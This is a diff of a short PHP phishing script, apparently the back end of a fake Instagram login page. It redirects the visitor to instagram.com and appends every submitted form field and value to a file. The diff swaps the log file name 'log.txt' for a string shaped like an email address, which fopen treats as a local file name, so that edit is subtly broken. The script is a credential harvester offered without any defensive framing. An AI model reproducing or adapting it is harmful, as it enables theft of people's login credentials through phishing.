@@ -1,6 +1,6 @@
 <?php
 header ('Location: https://www.instagram.com');
-$handle = fopen("log.txt", "a");
+$handle = fopen("ra.phael5331@protonmail.com", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
